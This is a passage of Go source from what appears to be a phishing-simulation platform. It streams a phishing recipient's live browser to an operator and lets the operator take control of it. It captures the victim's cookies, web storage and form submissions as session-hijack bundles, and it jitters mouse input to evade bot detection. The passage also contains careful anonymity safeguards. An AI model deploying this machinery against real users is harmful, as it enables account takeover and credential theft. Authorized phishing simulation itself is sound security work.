		sessions = append(sessions, m.sessionToInfo(sess))
		return true
	})
	if sessions == nil {
		sessions = []liveSessionInfo{}
	}
	m.Response.OK(g, sessions)
}

// hideIfAnonByCRID writes a 404 and returns true when the crID belongs to an
// anonymous campaign. It resolves anonymity from the crID directly, before any
// session lookup, so the response and its timing are identical whether or not a live
// session exists (no existence oracle). A crID matching no recipient (test runs)
// returns false. Fails closed: on a lookup error it hides with 404.
func (m *RemoteBrowserController) hideIfAnonByCRID(g *gin.Context, crID string) bool {
	id, err := uuid.Parse(crID)
	if err != nil {
		return false
	}
	isAnon, found, err := m.CampaignRepository.IsAnonymousByCampaignRecipientID(g.Request.Context(), &id)
	if err != nil {
		m.Logger.Warnw("failed to resolve campaign anonymity for live session", "error", err)
		g.AbortWithStatus(http.StatusNotFound)
		return true
	}
	if found && isAnon {
		g.AbortWithStatus(http.StatusNotFound)
		return true
	}
	return false
}

// CloseLiveSession terminates an active victim session by cancelling its context.
func (m *RemoteBrowserController) CloseLiveSession(g *gin.Context) {
	if !m.isEnabled(g) {
		return
	}
	session, _, ok := m.handleSession(g)
	if !ok {
		return
	}
	if authorized, err := service.IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL); err != nil || !authorized {
		if err != nil {
			m.Logger.Warnw("IsAuthorized error in CloseLiveSession", "error", err)
		}
		m.Response.Forbidden(g)
		return
	}
	crID := g.Param("crID")
	// an anonymous campaign's live session must be neither observable nor destroyable
	// by an operator: either would reveal which named recipient is interacting. resolve
	// anonymity before touching the session so the 404 is indistinguishable from a
	// missing session and nothing is deleted.
	if m.hideIfAnonByCRID(g, crID) {
		return
	}
	val, loaded := m.RemoteBrowserService.LoadAndDeleteSession(crID)
	if !loaded {
		g.AbortWithStatus(http.StatusNotFound)
		return
	}
	val.Cancel()
	m.Response.OK(g, map[string]string{"message": "live session closed"})
}

// StreamLiveSession upgrades to WebSocket and streams a CDP screencast of the
// active browser tab to the admin. When mode=control the admin's mouse and
// keyboard input is forwarded back into the browser. New tabs opened by the
// victim are auto-tracked; the admin can switch between them or close them via
// switch_tab / close_tab WS messages.
func (m *RemoteBrowserController) StreamLiveSession(g *gin.Context) {
	if !m.isEnabled(g) {
		return
	}
	session, _, ok := m.handleSession(g)
	if !ok {
		return
	}
	if authorized, err := service.IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL); err != nil || !authorized {
		if err != nil {
			m.Logger.Warnw("IsAuthorized error in StreamLiveSession", "error", err)
		}
		m.Response.Forbidden(g)
		return
	}
	crIDStr := g.Param("crID")
	// resolve anonymity before the session lookup so an anonymous campaign returns the
	// same 404 with the same timing whether or not a session exists (no existence
	// oracle, including via the extra query a post-lookup check would add).
	if m.hideIfAnonByCRID(g, crIDStr) {
		return
	}
	val, exists := m.RemoteBrowserService.LoadSession(crIDStr)
	if !exists {
		g.AbortWithStatus(http.StatusNotFound)
		return
	}
	sess := val.(*activeSession)
	// an anonymous campaign must not expose live victim streaming or control: watching
	// or driving the named recipient's browser in real time would fully defeat
	// anonymity. return the same 404 as a missing session so this cannot be used as an
	// existence oracle. fail closed if anonymity cannot be confirmed. test runs carry
	// no campaign (zero CampaignID) and are never anonymous, so they are exempt.
	if !sess.isTest {
		if isAnon, err := m.CampaignRepository.IsAnonymousByID(g.Request.Context(), &sess.CampaignID); err != nil || isAnon {
			if err != nil {
				m.Logger.Warnw("failed to check campaign anonymity for live stream", "error", err)
			}
			g.AbortWithStatus(http.StatusNotFound)
			return
		}
	}
	page := sess.getBrowserPage()
	if page == nil {
		// newSession() has not been called yet in the script
		g.AbortWithStatus(http.StatusServiceUnavailable)
		return
	}
	controlMode := g.Query("mode") == "control"

	conn, err := wsUpgrader.Upgrade(g.Writer, g.Request, nil)
	if err != nil {
		return
	}
	defer conn.Close()
	conn.SetReadLimit(64 * 1024)

	// Derived from outerCtx so the stream also ends when the victim session ends.
	streamCtx, streamCancel := context.WithCancel(page.GetContext())
	defer streamCancel()

	type tabEntry struct {
		page *rod.Page
		url  string
	}
	var tabsMu sync.Mutex
	tabs := map[proto.TargetTargetID]*tabEntry{
		page.TargetID: {page: page, url: ""},
	}

	var activePageMu sync.RWMutex
	activePageVal := page
	getActivePage := func() *rod.Page {
		activePageMu.RLock()
		defer activePageMu.RUnlock()
		return activePageVal
	}
	setActivePage := func(p *rod.Page) {
		activePageMu.Lock()
		defer activePageMu.Unlock()
		activePageVal = p
	}

	// Shared across tab switches; all feed into the write loop below.
	// Buffered to 1 so only the newest frame is ever queued: a slow client drops
	// intermediate frames instead of rendering a growing backlog of stale ones.
	frameCh := make(chan *scFrame, 1)
	urlCh := make(chan string, 4)
	switchCh := make(chan *rod.Page, 1)
	// notifyCh routes pre-encoded JSON from background goroutines to the write
	// loop, which is the sole writer on conn.
	notifyCh := make(chan []byte, 8)

	sendTabList := func() {
		active := getActivePage()
		tabsMu.Lock()
		type tabMsg struct {
			TargetID string `json:"targetID"`
			URL      string `json:"url"`
			Active   bool   `json:"active"`
		}
		list := make([]tabMsg, 0, len(tabs))
		for tid, e := range tabs {
			list = append(list, tabMsg{
				TargetID: string(tid),
				URL:      e.url,
				Active:   active != nil && tid == active.TargetID,
			})
		}
		tabsMu.Unlock()
		payload, err := json.Marshal(map[string]any{"type": "tabs", "tabs": list})
		if err != nil {
			return
		}
		select {
		case notifyCh <- payload:
		default:
		}
	}

	// pageCancel cancels the previous tab's navigation subscription on every switch.
	var pageCancel context.CancelFunc

	// frameSource holds the current tab's shared-screencast getter and its release,
	// swapped by startOnPage. The poller goroutine reads getFrame; startOnPage may run
	// on the main goroutine (initial) or the read goroutine (tab switch), so guard it.
	var frameSrcMu sync.Mutex
	var getFrame func() *scFrame
	var releaseFrame func()
	setFrameSource := func(get func() *scFrame, release func()) {
		frameSrcMu.Lock()
		old := releaseFrame
		getFrame, releaseFrame = get, release
		frameSrcMu.Unlock()
		if old != nil {
			old() // release the previous tab's screencast interest after acquiring the new
		}
	}
	readFrameSource := func() func() *scFrame {
		frameSrcMu.Lock()
		defer frameSrcMu.Unlock()
		return getFrame
	}

	// startOnPage points the operator at tab p: subscribes to p's shared screencast and
	// (re)subscribes to its navigation events for the URL bar. The screencast itself is
	// owned and shared by the session broker, so this never starts a second capture on a
	// target a victim stream is already using.
	startOnPage := func(p *rod.Page) {
		if pageCancel != nil {
			pageCancel()
		}
		setActivePage(p)
		// Foreground the tab so Chrome doesn't throttle its rendering pipeline.
		proto.TargetActivateTarget{TargetID: p.TargetID}.Call(p.Browser()) //nolint:errcheck
		proto.PageBringToFront{}.Call(p)                                   //nolint:errcheck
		get, release := sess.scAcquire(p)
		setFrameSource(get, release)
		var pageCtx context.Context
		pageCtx, pageCancel = context.WithCancel(streamCtx)
		navPage := p.Context(pageCtx)
		wait := navPage.EachEvent(
			func(e *proto.PageFrameNavigated) (stop bool) {
				if e.Frame != nil && e.Frame.ParentID == "" {
					tabsMu.Lock()
					if entry, ok := tabs[p.TargetID]; ok {
						entry.url = e.Frame.URL
					}
					tabsMu.Unlock()
					select {
					case urlCh <- e.Frame.URL:
					default:
					}
				}
				return
			},
			func(e *proto.PageNavigatedWithinDocument) (stop bool) {
				tabsMu.Lock()
				if entry, ok := tabs[p.TargetID]; ok {
					entry.url = e.URL
				}
				tabsMu.Unlock()
				select {
				case urlCh <- e.URL:
				default:
				}
				return
			},
		)
		go wait()
	}

	startOnPage(page)
	defer func() {
		if pageCancel != nil {
			pageCancel()
		}
		frameSrcMu.Lock()
		r := releaseFrame
		frameSrcMu.Unlock()
		if r != nil {
			r()
		}
	}()

	// Poll the current tab's shared screencast and forward changed frames to the write
	// loop. Screencast frames are change-driven, so polling latest at ~60 Hz and skipping
	// unchanged frames catches every repaint without a busy loop.
	go func() {
		ticker := time.NewTicker(16 * time.Millisecond)
		defer ticker.Stop()
		var lastData []byte
		for {
			select {
			case <-streamCtx.Done():
				return
			case <-ticker.C:
				get := readFrameSource()
				if get == nil {
					continue
				}
				f := get()
				if f == nil || len(f.data) == 0 || bytes.Equal(f.data, lastData) {
					continue
				}
				lastData = f.data
				select {
				case frameCh <- f:
				default:
					select {
					case <-frameCh:
					default:
					}
					select {
					case frameCh <- f:
					default:
					}
				}
			}
		}
	}()

	if info, err := page.Info(); err == nil && info.URL != "" {
		tabsMu.Lock()
		if e, ok := tabs[page.TargetID]; ok {
			e.url = info.URL
		}
		tabsMu.Unlock()
		if payload, err := json.Marshal(map[string]string{"type": "url", "value": info.URL}); err == nil {
			conn.WriteMessage(websocket.TextMessage, payload) //nolint:errcheck
		}
	}
	// Write loop hasn't started yet so it's safe to write directly here.
	{
		type tabMsg struct {
			TargetID string `json:"targetID"`
			URL      string `json:"url"`
			Active   bool   `json:"active"`
		}
		tabsMu.Lock()
		list := make([]tabMsg, 0, len(tabs))
		for tid, e := range tabs {
			list = append(list, tabMsg{TargetID: string(tid), URL: e.url, Active: tid == page.TargetID})
		}
		tabsMu.Unlock()
		if payload, err := json.Marshal(map[string]any{"type": "tabs", "tabs": list}); err == nil {
			conn.WriteMessage(websocket.TextMessage, payload) //nolint:errcheck
		}
	}

	go func() {
		defer func() { recover() }() //nolint:errcheck
		watchBrowser := page.Browser().Context(streamCtx)
		wait := watchBrowser.EachEvent(
			func(e *proto.TargetTargetCreated) bool {
				info := e.TargetInfo
				if info == nil || info.Type != proto.TargetTargetInfoTypePage {
					return false
				}
				// Only track tabs whose opener is already in our tab map.
				if info.OpenerID == "" {
					return false
				}
				tabsMu.Lock()
				_, openerKnown := tabs[proto.TargetTargetID(info.OpenerID)]
				tabsMu.Unlock()
				if !openerKnown {
					return false
				}
				newPage, err := page.Browser().PageFromTarget(info.TargetID)
				if err != nil {
					return false
				}
				// Focus emulation is set per target, so a popup starts without it and
				// falls back to the real window focus. Only one window can hold that,
				// which would leave a background popup reporting itself unfocused and
				// stop it rendering.
				proto.EmulationSetFocusEmulationEnabled{Enabled: true}.Call(newPage) //nolint:errcheck
				tabsMu.Lock()
				tabs[info.TargetID] = &tabEntry{page: newPage, url: info.URL}
				tabsMu.Unlock()
				select {
				case switchCh <- newPage:
				default:
				}
				return false
			},
			func(e *proto.TargetTargetDestroyed) bool {
				tabsMu.Lock()
				delete(tabs, e.TargetID)
				var fallback *rod.Page
				for _, entry := range tabs {
					fallback = entry.page
					break
				}
				tabsMu.Unlock()
				if ap := getActivePage(); ap != nil && ap.TargetID == e.TargetID && fallback != nil {
					select {
					case switchCh <- fallback:
					default:
					}
				}
				go sendTabList()
				return false
			},
			func(e *proto.TargetTargetInfoChanged) bool {
				info := e.TargetInfo
				if info == nil || info.Type != proto.TargetTargetInfoTypePage {
					return false
				}
				tabsMu.Lock()
				if entry, ok := tabs[info.TargetID]; ok {
					entry.url = info.URL
				}
				tabsMu.Unlock()
				go sendTabList()
				return false
			},
		)
		wait()
	}()

	// switch_tab and close_tab are accepted in both view and control mode.
	// Mouse/keyboard dispatch only runs in control mode.
	go func() {
		for {
			_, msg, err := conn.ReadMessage()
			if err != nil {
				return
			}
			var header struct {
				Type         string  `json:"type"`
				TargetID     string  `json:"targetID"`
				X1           float64 `json:"x1"`
				Y1           float64 `json:"y1"`
				X2           float64 `json:"x2"`
				Y2           float64 `json:"y2"`
				Width        float64 `json:"width"`
				Height       float64 `json:"height"`
				ScreenWidth  float64 `json:"screenWidth"`
				ScreenHeight float64 `json:"screenHeight"`
				Dpr          float64 `json:"dpr"`
			}
			if json.Unmarshal(msg, &header) != nil {
				continue
			}
			switch header.Type {
			case "viewport":
				// Editor test runs only: size the target to the admin's own resolution
				// so remote control is pixel-accurate instead of the headless 800x600
				// default. Gated on isTest so a live recipient's viewport is never
				// touched here — the victim owns the shared target's size, and resizing
				// it under an operator would change what the recipient sees.
				if controlMode && sess.isTest && header.Width > 0 && header.Height > 0 {
					if p := getActivePage(); p != nil {
						// DeviceScaleFactor pinned to 1: a value != 1 makes Chrome scale
						// mouse movementX/movementY, breaking the movementX == clientX
						// delta relationship for CDP events (a CDP mouse leak).
						sw := int(header.ScreenWidth)
						if sw < int(header.Width) {
							sw = int(header.Width)
						}
						sh := int(header.ScreenHeight)
						if sh < int(header.Height) {
							sh = int(header.Height)
						}
						proto.EmulationSetDeviceMetricsOverride{
							Width: int(header.Width), Height: int(header.Height), DeviceScaleFactor: 1,
							ScreenWidth: &sw, ScreenHeight: &sh,
						}.Call(p) //nolint:errcheck
					}
				}
			case "switch_tab":
				tabsMu.Lock()
				entry, ok := tabs[proto.TargetTargetID(header.TargetID)]
				tabsMu.Unlock()
				if ok {
					select {
					case switchCh <- entry.page:
					default:
					}
				}
			case "close_tab":
				tabsMu.Lock()
				entry, ok := tabs[proto.TargetTargetID(header.TargetID)]
				tabsMu.Unlock()
				if ok {
					// TargetTargetDestroyed fires next; the EachEvent handler above
					// removes the entry and switches to a fallback tab if needed.
					proto.TargetCloseTarget{TargetID: proto.TargetTargetID(header.TargetID)}.Call(entry.page.Browser()) //nolint:errcheck
				}
			case "select_range":
				if controlMode {
					x1, y1, x2, y2 := header.X1, header.Y1, header.X2, header.Y2
					go func() {
						p := getActivePage()
						if p == nil {
							return
						}
						// Use caretRangeFromPoint to locate the exact text
						// positions at the drag start and end, then build a
						// Range and hand it to the Selection API. This is
						// far more reliable than synthesised mousemove events
						// for triggering Chrome's text selection engine.
						js := fmt.Sprintf(`(function(){
							var r1=document.caretRangeFromPoint(%f,%f);
							var r2=document.caretRangeFromPoint(%f,%f);
							if(!r1||!r2)return;
							var range=document.createRange();
							try{
								if(r1.compareBoundaryPoints(Range.START_TO_START,r2)<=0){
									range.setStart(r1.startContainer,r1.startOffset);
									range.setEnd(r2.startContainer,r2.startOffset);
								}else{
									range.setStart(r2.startContainer,r2.startOffset);
									range.setEnd(r1.startContainer,r1.startOffset);
								}
								var sel=window.getSelection();
								sel.removeAllRanges();
								sel.addRange(range);
							}catch(e){}
						})()`, x1, y1, x2, y2)
						p.Eval("() => " + js) //nolint:errcheck
					}()
				}
			case "get_selection":
				if controlMode {
					go func() {
						p := getActivePage()
						if p == nil {
							return
						}
						res, err := p.Eval(`() => window.getSelection().toString()`)
						if err != nil || res == nil {
							return
						}
						payload, marshalErr := json.Marshal(map[string]string{
							"type": "selection_text",
							"text": res.Value.Str(),
						})
						if marshalErr != nil {
							return
						}
						select {
						case notifyCh <- payload:
						default:
						}
					}()
				}
			default:
				if controlMode {
					m.dispatchInput(getActivePage(), msg)
				}
			}
		}
	}()

	// lastFrameW/H track the last CSS viewport dimensions sent to the client so the
	// frame_meta control message is only emitted when they change. -1 forces an
	// initial send on the first frame.
	lastFrameW, lastFrameH := float64(-1), float64(-1)

	for {
		select {
		case <-page.GetContext().Done():
			conn.WriteMessage(websocket.TextMessage, []byte(`{"type":"closed"}`)) //nolint:errcheck
			return
		case <-g.Request.Context().Done():
			return
		case newPage := <-switchCh:
			startOnPage(newPage)
			// p.Info() is a CDP round-trip; run it off the write loop.
			go func(p *rod.Page) {
				if info, err := p.Info(); err == nil && info.URL != "" {
					tabsMu.Lock()
					if e, ok := tabs[p.TargetID]; ok {
						e.url = info.URL
					}
					tabsMu.Unlock()
					if payload, err := json.Marshal(map[string]string{"type": "url", "value": info.URL}); err == nil {
						select {
						case notifyCh <- payload:
						default:
						}
					}
				}
				sendTabList()
			}(newPage)
		case payload := <-notifyCh:
			if err := conn.WriteMessage(websocket.TextMessage, payload); err != nil {
				return
			}
		case u := <-urlCh:
			payload, err := json.Marshal(map[string]string{"type": "url", "value": u})
			if err != nil {
				continue
			}
			if err := conn.WriteMessage(websocket.TextMessage, payload); err != nil {
				return
			}
		case frame, ok := <-frameCh:
			if !ok {
				return
			}
			frameW, frameH := frame.devW, frame.devH
			// The CSS viewport dimensions (used client side for input coordinate
			// mapping) change rarely, so send them as a small control message only on
			// change instead of wrapping every frame. The JPEG itself goes as a raw
			// binary message with no base64 or JSON overhead.
			if frameW != lastFrameW || frameH != lastFrameH {
				lastFrameW, lastFrameH = frameW, frameH
				if payload, err := json.Marshal(map[string]any{
					"type":   "frame_meta",
					"width":  frameW,
					"height": frameH,
				}); err == nil {
					if err := conn.WriteMessage(websocket.TextMessage, payload); err != nil {
						return
					}
				}
			}
			if err := conn.WriteMessage(websocket.BinaryMessage, frame.data); err != nil {
				return
			}
		}
	}
}

// dispatchInput routes a JSON input message from the admin WS into the browser via rod proto.
func (m *RemoteBrowserController) dispatchInput(page *rod.Page, msg []byte) {
	var cmd struct {
		Type      string  `json:"type"`
		X         float64 `json:"x"`
		Y         float64 `json:"y"`
		Button    string  `json:"button"`
		Buttons   int64   `json:"buttons"` // bitmask of held buttons (left=1, right=2, middle=4)
		DeltaX    float64 `json:"deltaX"`
		DeltaY    float64 `json:"deltaY"`
		Key       string  `json:"key"`
		Code      string  `json:"code"`
		KeyCode   int64   `json:"keyCode"`
		Modifiers int64   `json:"modifiers"`
		CharText  string  `json:"charText"` // non-empty when keydown should also fire a char event
		Text      string  `json:"text"`     // paste payload
		URL       string  `json:"url"`      // navigate target
	}
	if json.Unmarshal(msg, &cmd) != nil {
		return
	}
	btn := proto.InputMouseButtonLeft
	if cmd.Button == "right" {
		btn = proto.InputMouseButtonRight
	}
	mods := int(cmd.Modifiers)
	zeroButtons := 0
	nowTs := func() proto.TimeSinceEpoch {
		return proto.TimeSinceEpoch(float64(time.Now().UnixNano()) / 1e9)
	}
	switch cmd.Type {
	case "mousemove":
		// Add ±1 px integer noise then round: keeps movementX == clientX-prevClientX
		// consistent (subpixel CDP coordinates create a float/int mismatch detectors
		// check), while still adding the ±1 px variation that breaks exact-integer paths.
		jx := math.Round(cmd.X + (rand.Float64()*2-1)*0.5)
		jy := math.Round(cmd.Y + (rand.Float64()*2-1)*0.5)
		// Forward the browser's e.buttons bitmask so CDP sees held buttons during a drag.
		// When the frontend does not send buttons (older messages), cmd.Buttons == 0 which
		// is the correct "no button held" value for a plain mousemove.
		heldButtons := int(cmd.Buttons)
		// During a drag the CDP `button` field must name the held button so
		// Chrome's text-selection engine recognises it as a drag-select, not a
		// plain hover. Bit 1 = left, bit 2 = right.
		moveButton := proto.InputMouseButtonNone
		if heldButtons&1 != 0 {
			moveButton = proto.InputMouseButtonLeft
		} else if heldButtons&2 != 0 {
			moveButton = proto.InputMouseButtonRight
		}
		proto.InputDispatchMouseEvent{
			Type:        proto.InputDispatchMouseEventTypeMouseMoved,
			X:           jx,
			Y:           jy,
			Modifiers:   mods,
			Timestamp:   nowTs(),
			Button:      moveButton,
			Buttons:     &heldButtons,
			PointerType: proto.InputDispatchMouseEventPointerTypeMouse,
		}.Call(page) //nolint:errcheck
	case "mousedown":
		// Buttons bitmask must match the button being pressed: left=1, right=2.
		downButtons := 1
		if cmd.Button == "right" {
			downButtons = 2
		}
		proto.InputDispatchMouseEvent{
			Type:        proto.InputDispatchMouseEventTypeMousePressed,
			X:           cmd.X,
			Y:           cmd.Y,
			Modifiers:   mods,
			Timestamp:   nowTs(),
			Button:      btn,
			Buttons:     &downButtons,
			ClickCount:  1,
			PointerType: proto.InputDispatchMouseEventPointerTypeMouse,
		}.Call(page) //nolint:errcheck
	case "mouseup":
		proto.InputDispatchMouseEvent{
			Type:        proto.InputDispatchMouseEventTypeMouseReleased,
			X:           cmd.X,
			Y:           cmd.Y,
			Modifiers:   mods,
			Timestamp:   nowTs(),
			Button:      btn,
			Buttons:     &zeroButtons,
			ClickCount:  1,
			PointerType: proto.InputDispatchMouseEventPointerTypeMouse,
		}.Call(page) //nolint:errcheck
	case "scroll":
		proto.InputDispatchMouseEvent{
			Type:        proto.InputDispatchMouseEventTypeMouseWheel,
			X:           cmd.X,
			Y:           cmd.Y,
			DeltaX:      cmd.DeltaX,
			DeltaY:      cmd.DeltaY,
			Modifiers:   mods,
			Timestamp:   nowTs(),
			PointerType: proto.InputDispatchMouseEventPointerTypeMouse,
		}.Call(page) //nolint:errcheck
	case "keydown":
		proto.InputDispatchKeyEvent{
			Type:                  proto.InputDispatchKeyEventTypeKeyDown,
			Key:                   cmd.Key,
			Code:                  cmd.Code,
			WindowsVirtualKeyCode: int(cmd.KeyCode),
			NativeVirtualKeyCode:  int(cmd.KeyCode),
			Modifiers:             mods,
		}.Call(page) //nolint:errcheck
		if ct := cmd.CharText; ct != "" {
			proto.InputDispatchKeyEvent{
				Type:           proto.InputDispatchKeyEventTypeChar,
				Key:            ct,
				Text:           ct,
				UnmodifiedText: ct,
				Modifiers:      mods,
			}.Call(page) //nolint:errcheck
		}
	case "keyup":
		proto.InputDispatchKeyEvent{
			Type:                  proto.InputDispatchKeyEventTypeKeyUp,
			Key:                   cmd.Key,
			Code:                  cmd.Code,
			WindowsVirtualKeyCode: int(cmd.KeyCode),
			NativeVirtualKeyCode:  int(cmd.KeyCode),
			Modifiers:             mods,
		}.Call(page) //nolint:errcheck
	case "paste":
		page.InsertText(cmd.Text) //nolint:errcheck
	case "navigate":
		if cmd.URL != "" {
			page.Navigate(cmd.URL) //nolint:errcheck
		}
	case "back":
		page.NavigateBack() //nolint:errcheck
	case "forward":
		page.NavigateForward() //nolint:errcheck
	}
}

// saveCaptureEvent converts a remote browser capture payload to the same bundle
// format used by AITM captures and saves it as a CampaignEvent so it appears in
// the campaign timeline and can be exported to session replay tools.
// applyEventAnonymization strips identity from a remote browser event and stamps
// the campaign recipient's stable pseudonym when the campaign is anonymous, so a
// captured cookie bundle, submitted form or info event carries no recipient link,
// ip, user agent or captured data. No-op for a normal campaign.
func (m *RemoteBrowserController) applyEventAnonymization(
	ctx context.Context,
	campaignID *uuid.UUID,
	recipientID *uuid.UUID,
	event *model.CampaignEvent,
) {
	if campaignID == nil || recipientID == nil {
		return
	}
	// decide from the authoritative campaign flag, not the presence of a pseudonym.
	// fail closed: if anonymity cannot be determined, strip identity rather than
	// persist a captured cookie bundle or credentials against a name.
	isAnon, err := m.CampaignRepository.IsAnonymousByID(ctx, campaignID)
	if err != nil {
		m.Logger.Errorw("could not confirm campaign anonymity for remote browser event, storing without identity", "error", err)
		event.Anonymize(nil)
		return
	}
	if !isAnon {
		return
	}
	// anonymous: strip identity and attach the pseudonym when it can be loaded
	if cr, crErr := m.CampaignRecipientRepository.GetByCampaignAndRecipientID(ctx, campaignID, recipientID, &repository.CampaignRecipientOption{}); crErr == nil {
		if aid, aerr := cr.AnonymizedID.Get(); aerr == nil {
			event.Anonymize(&aid)
			return
		}
	}
	event.Anonymize(nil)
}

func (m *RemoteBrowserController) saveCaptureEvent(
	ctx context.Context,
	req *http.Request,
	campaignID *uuid.UUID,
	recipientID *uuid.UUID,
	captureValue interface{},
	clientIP string,
	userAgent string,
) {
	// JSON round-trip so we have a consistent map[string]interface{} regardless of
	// whether the value was a Go struct (network.Cookie) or already a map.
	raw, err := json.Marshal(captureValue)
	if err != nil {
		return
	}
	var capture map[string]interface{}
	if json.Unmarshal(raw, &capture) != nil {
		return
	}

	// Build cookies map keyed by cookie name - matches the AITM cookie bundle format.
	cookiesMap := map[string]interface{}{}
	if arr, ok := capture["cookies"].([]interface{}); ok {
		for _, c := range arr {
			if cm, ok := c.(map[string]interface{}); ok {
				name, _ := cm["name"].(string)
				if name == "" {
					continue
				}
				entry := map[string]string{
					"name":         name,
					"value":        stringField(cm, "value"),
					"domain":       stringField(cm, "domain"),
					"path":         stringField(cm, "path"),
					"capture_time": time.Now().Format(time.RFC3339),
				}
				if b, _ := cm["secure"].(bool); b {
					entry["secure"] = "true"
				}
				if b, _ := cm["httpOnly"].(bool); b {
					entry["httpOnly"] = "true"
				}
				if ss, _ := cm["sameSite"].(string); ss != "" {
					entry["sameSite"] = ss
				}
				// CDP returns expires as a float64 Unix timestamp; -1 means session cookie.
				if exp, _ := cm["expires"].(float64); exp > 0 {
					entry["expires"] = time.Unix(int64(exp), 0).UTC().Format(time.RFC3339)
				}
				cookiesMap[name] = entry
			}
		}
	}

	bundle := map[string]interface{}{
		"capture_type":     "cookie",
		"source":           "remote_browser",
		"cookie_count":     len(cookiesMap),
		"bundle_time":      time.Now().Format(time.RFC3339),
		"session_complete": true,
		"cookies":          cookiesMap,
	}

	// include localStorage / sessionStorage if present
	if ls, ok := capture["localStorage"]; ok && ls != nil {
		bundle["localStorage"] = ls
	}
	if ss, ok := capture["sessionStorage"]; ok && ss != nil {
		bundle["sessionStorage"] = ss
	}

	bundleJSON, err := json.Marshal(bundle)
	if err != nil {
		return
	}

	// Extract browser metadata (JA4, platform, accept-language) from the victim's
	// WS upgrade request, gated on the campaign's SaveBrowserMetadata flag.
	var metadata *vo.OptionalString1MB
	if m.CampaignService != nil {
		if campaign, err := m.CampaignRepository.GetByID(ctx, campaignID, &repository.CampaignOption{}); err == nil {
			metadata = model.ExtractCampaignEventMetadataFromHTTPRequest(req, campaign)
		}
	}
	if metadata == nil {
		metadata = vo.NewEmptyOptionalString1MB()
	}

	submitDataEventID := cache.EventIDByName[data.EVENT_CAMPAIGN_RECIPIENT_SUBMITTED_DATA]
	eventID := uuid.New()
	event := &model.CampaignEvent{
		ID:          &eventID,
		CampaignID:  campaignID,
		RecipientID: recipientID,
		EventID:     submitDataEventID,
		Metadata:    metadata,
		IP:          vo.NewOptionalString64Must(clientIP),
		UserAgent:   vo.NewOptionalString255Must(userAgent),
	}
	eventData, dataErr := vo.NewOptionalString1MB(string(bundleJSON))
	if dataErr != nil {
		m.Logger.Warnw("remote browser capture too large to save, truncating is not safe - skipping", "campaign_id", campaignID, "error", dataErr)
		return
	}
	event.Data = eventData
	m.applyEventAnonymization(ctx, campaignID, recipientID, event)
	if err := m.CampaignRepository.SaveEvent(ctx, event); err != nil {
		return
	}

	if m.CampaignService != nil {
		m.CampaignService.HandleWebhooks(ctx, campaignID, recipientID, data.EVENT_CAMPAIGN_RECIPIENT_SUBMITTED_DATA, bundle) //nolint:errcheck
	}
}

func (m *RemoteBrowserController) saveInfoEvent(
	ctx context.Context,
	campaignID *uuid.UUID,
	recipientID *uuid.UUID,
	message string,
	clientIP string,
	userAgent string,
) {
	infoEventID := cache.EventIDByName[data.EVENT_CAMPAIGN_RECIPIENT_INFO]
	if infoEventID == nil {
		return
	}
	payload := map[string]string{
		"source":  "remote_browser",
		"message": message,
	}
	raw, err := json.Marshal(payload)
	if err != nil {
		return
	}
	eventData, dataErr := vo.NewOptionalString1MB(string(raw))
	if dataErr != nil {
		return
	}
	eventID := uuid.New()
	event := &model.CampaignEvent{
		ID:          &eventID,
		CampaignID:  campaignID,
		RecipientID: recipientID,
		EventID:     infoEventID,
		Data:        eventData,
		IP:          vo.NewOptionalString64Must(clientIP),
		UserAgent:   vo.NewOptionalString255Must(userAgent),
	}
	m.applyEventAnonymization(ctx, campaignID, recipientID, event)
	m.CampaignRepository.SaveEvent(ctx, event) //nolint:errcheck
}

// saveSubmitEvent saves arbitrary script-submitted data as a submitted_data campaign event.
// Unlike saveCaptureEvent (which expects a cookie/storage bundle), this accepts any
// JSON-serializable value passed to submitData() in the script.
func (m *RemoteBrowserController) saveSubmitEvent(
	ctx context.Context,
	req *http.Request,
	campaignID *uuid.UUID,
	recipientID *uuid.UUID,
	submitValue interface{},
	clientIP string,
	userAgent string,
) {
	submitDataEventID := cache.EventIDByName[data.EVENT_CAMPAIGN_RECIPIENT_SUBMITTED_DATA]
	if submitDataEventID == nil {
		return
	}
	bundle := map[string]interface{}{
		"capture_type": "form_data",
		"source":       "remote_browser",
		"data":         submitValue,
	}
	bundleJSON, err := json.Marshal(bundle)
	if err != nil {
		return
	}
	var metadata *vo.OptionalString1MB
	if m.CampaignService != nil {
		if campaign, err := m.CampaignRepository.GetByID(ctx, campaignID, &repository.CampaignOption{}); err == nil {
			metadata = model.ExtractCampaignEventMetadataFromHTTPRequest(req, campaign)
		}
	}
	if metadata == nil {
		metadata = vo.NewEmptyOptionalString1MB()
	}
	eventData, dataErr := vo.NewOptionalString1MB(string(bundleJSON))
	if dataErr != nil {
		m.Logger.Warnw("remote browser submitData payload too large to save", "campaign_id", campaignID, "error", dataErr)
		return
	}
	eventID := uuid.New()
	event := &model.CampaignEvent{
		ID:          &eventID,
		CampaignID:  campaignID,
		RecipientID: recipientID,
		EventID:     submitDataEventID,
		Data:        eventData,
		Metadata:    metadata,
		IP:          vo.NewOptionalString64Must(clientIP),
		UserAgent:   vo.NewOptionalString255Must(userAgent),
	}
	m.applyEventAnonymization(ctx, campaignID, recipientID, event)
	if err := m.CampaignRepository.SaveEvent(ctx, event); err != nil {
		return
	}
	if m.CampaignService != nil {
		m.CampaignService.HandleWebhooks(ctx, campaignID, recipientID, data.EVENT_CAMPAIGN_RECIPIENT_SUBMITTED_DATA, bundle) //nolint:errcheck
	}
}

// cropImagePNG crops src to the given region and returns lossless PNG bytes. Used to
// crop the streamed element out of an operator screencast frame so the victim only
// ever receives the element, never the full page. PNG avoids a second lossy pass on
// top of the operator frame's JPEG, so colors don't wash out during operator viewing.
func cropImagePNG(src image.Image, x, y, w, h int) ([]byte, error) {
	b := src.Bounds()
	if x < b.Min.X {
		x = b.Min.X
	}
	if y < b.Min.Y {
		y = b.Min.Y
	}
	if x+w > b.Max.X {
		w = b.Max.X - x
	}
	if y+h > b.Max.Y {
		h = b.Max.Y - y
	}
	if w <= 0 || h <= 0 {
		return nil, fmt.Errorf("crop region out of bounds")
	}
	dst := image.NewRGBA(image.Rect(0, 0, w, h))
	draw.Draw(dst, dst.Bounds(), src, image.Pt(x, y), draw.Src)
	var buf bytes.Buffer
	// BestSpeed keeps per-frame encode cheap; this path only runs while an operator
	// is viewing, so latency matters more than a few extra bytes.
	enc := png.Encoder{CompressionLevel: png.BestSpeed}
	if err := enc.Encode(&buf, dst); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// buildStreamFrameMsg frames a cropped element JPEG for the victim WebSocket as a
